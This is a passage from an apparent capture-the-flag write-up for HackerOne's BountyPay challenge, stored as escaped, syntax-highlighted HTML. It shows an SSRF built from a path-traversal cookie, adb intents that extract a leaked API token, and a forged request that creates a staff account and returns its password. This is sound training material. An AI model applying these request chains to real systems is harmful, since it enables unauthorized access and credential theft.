class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003econtainer\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;div class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003erow\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;div class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ecol-sm-6 col-sm-offset-3\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e            \u0026lt;h1 style=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etext-align: center\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;Software Storage\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eh1\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e            \u0026lt;form method=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epost\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e action=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                \u0026lt;div class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epanel panel-default\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e style=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emargin-top:50px\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                    \u0026lt;div class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epanel-heading\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;Login\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                    \u0026lt;div class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epanel-body\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                        \u0026lt;div style=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emargin-top:7px\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;label\u0026gt;Username:\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003elabel\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                        \u0026lt;div\u0026gt;\u0026lt;input name=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eusername\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eform-control\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                        \u0026lt;div style=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003emargin-top:7px\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;label\u0026gt;Password:\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003elabel\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                        \u0026lt;div\u0026gt;\u0026lt;input name=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epassword\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e type=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003epassword\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eform-control\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                    \u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                \u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e                \u0026lt;input type=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esubmit\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e class=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ebtn btn-success pull-right\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e value=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eLogin\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e            \u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eform\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e        \u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ediv\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;script src=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ejs\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ejquery.min.js\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003escript\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;script src=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ejs\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ebootstrap.min.js\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003escript\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ebody\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehtml\u0026gt;\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003edata\u003c/code\u003e json contains the login page for \u003ccode\u003esoftware.bountypay.h1ctf.com\u003c/code\u003e - this means we have a way to make requests inside the network, bypassing the ip restriction aka ssrf :yay: \u003cbr\u003e\nAfter some time of thinking what could be there I figure it would have something to download and it made sense, a lot of companies host software on a different subdomain under \u003ccode\u003e/downloads, /software\u003c/code\u003e or in this case \u003ccode\u003e/uploads\u003c/code\u003e making the correct request yields\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e# decoded cookie\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;account_id\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;F8gHiqSdpK/../../../redirect?url=https://software.bountypay.h1ctf.com/uploads#\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;hash\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# request\u003c/span\u003e\nGET /statements?month\u003cspan class=\"o\"\u003e=\u003c/span\u003e04\u0026amp;year\u003cspan class=\"o\"\u003e=\u003c/span\u003e2020 HTTP/1.1\nHost: app.bountypay.h1ctf.com\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\nAccept: \u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\nUser-Agent: Mozilla/5.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eMacintosh\u003cspan class=\"p\"\u003e;\u003c/span\u003e Intel Mac OS X 10_14_6\u003cspan class=\"o\"\u003e)\u003c/span\u003e AppleWebKit/537.36 \u003cspan class=\"o\"\u003e(\u003c/span\u003eKHTML, like Gecko\u003cspan class=\"o\"\u003e)\u003c/span\u003e Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://app.bountypay.h1ctf.com/\nAccept-Encoding: \u003cspan class=\"nb\"\u003egzip\u003c/span\u003e, deflate\nAccept-Language: en-US,en\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.9\nCookie: \u003cspan class=\"nv\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003eeyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSy8uLi8uLi8uLi9yZWRpcmVjdD91cmw9aHR0cHM6Ly9zb2Z0d2FyZS5ib3VudHlwYXkuaDFjdGYuY29tL3VwbG9hZHMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\n\n\u003cspan class=\"c\"\u003e# data response\u003c/span\u003e\n\u003cspan class=\"s2\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;html\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003etitle\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehead\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;body bgcolor=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewhite\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;h1\u0026gt;Index of \u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eh1\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;pre\u0026gt;\u0026lt;a href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ea\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;a href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003euploads\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eBountyPay.apk\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;BountyPay.apk\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ea\u0026gt;                                        20-Apr-2020 11:26              4043701\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003epre\u0026gt;\u0026lt;hr\u0026gt;\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ebody\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehtml\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can see what\u0026#39;s hosted there ðŸ‘€ now you can download the \u003ccode\u003eapk\u003c/code\u003e by going to: \u003ca href=\"/redirect?url=https%3A%2F%2Fsoftware.bountypay.h1ctf.com%2Fuploads%2FBountyPay.apk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://software.bountypay.h1ctf.com/uploads/BountyPay.apk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n\n\u003ch3 id=\"apk\"\u003eapk\u003c/h3\u003e\n\n\u003cp\u003eThis part was hard for me, but thanks again to Al-Madjus I was able to complete it using \u003ccode\u003eadb\u003c/code\u003e and generating intents with the correct payloads, all the information was inside the apk.\u003c/p\u003e\n\n\u003cp\u003eI used \u003ccode\u003eandroid studio\u003c/code\u003e and \u003ccode\u003eadb\u003c/code\u003e (if you have the emulator running you just need to run a shell by using \u003ccode\u003eadb\u003c/code\u003e \u003ccode\u003e$ adb shell\u003c/code\u003e)to complete the challenges:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eActivityOne\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eam start -a android.intent.action.VIEW -d \u0026quot;one://part?start=PartTwoActivity\u0026quot; -n bounty.pay/.PartOneActivity\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eActivityTwo\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eam start -a android.intent.action.VIEW -d \u0026quot;two://part?two=light\u0026amp;switch=on\u0026quot; -n bounty.pay/.PartTwoActivity\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eActivityThree\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eam start -a android.intent.action.VIEW -d \u0026quot;three://part?three=UGFydFRocmVVlQWN0aXZpdHk=\u0026amp;switch=b24=\u0026amp;header=X-Token\u0026quot; -n bounty.pay/.PartThreeActivity\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eHeader value: \u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e \u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAll the params were in the \u003ccode\u003eapk\u003c/code\u003e - once you read the disassembled code you could see the flow of the program and use those to create the intents you needed - again huge thanks to AlMadjus for the help here.\u003c/p\u003e\n\n\u003cp\u003eAfter completing this challenge we have access to a leaked token: \u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e which I grabbed from the cat log from android studi.\u003cbr\u003e\nWe also know that we need to add that header with the token somewhere - if I remember correctly one of the subdomains asked specifically for a token when making requests directly to it: \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"api-bountypay-h1ctf-com\"\u003eapi.bountypay.h1ctf.com\u003c/h3\u003e\n\n\u003cp\u003eUsing the new \u003ccode\u003eX-Token: 8e9998ee3137ca9ade8f372739f062c1\u003c/code\u003e header, let\u0026#39;s test the \u003ccode\u003eapi\u003c/code\u003e endpoint and see if I can now make requests, I found the \u003ccode\u003e/api/staff\u003c/code\u003e endpoint which yields:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e[{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Sam Jenkins\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:84DJKEIP38\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Brian Oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n    \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;staff_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;STF:KE624RQ2T9\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}]\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHere I took a small detour and went on twitter - the \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBountypayHQ%2Fstatus%2F1258692145252270080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eHackerOne\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e account released some clues, including a twitter account for \u003ccode\u003ebountypay\u003c/code\u003e which only followed three accounts which included the \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FSandraA76708114\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003enewest\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e employee and she even shared a pic of her cool new work badge with her \u003ccode\u003eSTF\u003c/code\u003e number on it- let\u0026#39;s use that try to use that somewhere.\u003cbr\u003e\nIn the above \u003ccode\u003eGET\u003c/code\u003e request to \u003ccode\u003e/api/staff\u003c/code\u003e we get the current employees and their \u003ccode\u003estaff_id\u003c/code\u003e which is the same format that Sandra\u0026#39;s badge has! but she\u0026#39;s not in the system yet? Maybe she hasn\u0026#39;t gotten set up yet? Let\u0026#39;s help her out. After sending an inital \u003ccode\u003ePOST\u003c/code\u003e request without any parms I received this error \u003ccode\u003e\u0026quot;Missing Parameter\u0026quot;\u003c/code\u003e so what paramet can we pass? her name? I don\u0026#39;t think so maybe her staff_id is workin - let\u0026#39;s try it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e// POST to create an account using th STF number \u003cspan class=\"k\"\u003ein \u003c/span\u003ethe image\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nConnection: close\nCache-Control: max-age\u003cspan class=\"o\"\u003e=\u003c/span\u003e0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eMacintosh\u003cspan class=\"p\"\u003e;\u003c/span\u003e Intel Mac OS X 10_14_6\u003cspan class=\"o\"\u003e)\u003c/span\u003e AppleWebKit/537.36 \u003cspan class=\"o\"\u003e(\u003c/span\u003eKHTML, like Gecko\u003cspan class=\"o\"\u003e)\u003c/span\u003e Chrome/83.0.4103.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.9,image/webp,image/apng,\u003cspan class=\"k\"\u003e*\u003c/span\u003e/\u003cspan class=\"k\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.8,application/signed-exchange\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003ev\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eb3\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"nv\"\u003eq\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.9\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\n\u003cspan class=\"nv\"\u003estaff_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSTF:8FJ3KFISL3\n\n// response with username and password! \nHTTP/1.1 201 Created\nServer: nginx/1.14.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\nDate: Sun, 31 May 2020 22:11:43 GMT\nContent-Type: application/json\nConnection: close\nContent-Length: 110\n\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;description\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;Staff Member Account Created\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;sandra.allison\u0026quot;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e:\u003cspan class=\"s2\"\u003e\u0026quot;s%3D8qB8zEpMnc*xsz7Yp5\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow we have a \u003ccode\u003estaff\u003c/code\u003e account! which should work for the \u003ccode\u003estaff.bountypay.h1ctf.com\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"staff-bountypay-h1ctf-com\"\u003estaff.bountypay.h1ctf.com\u003c/h3\u003e\n\n\u003cp\u003eWith our new \u003ccode\u003estaff\u003c/code\u003e account we can sign into the \u003ca 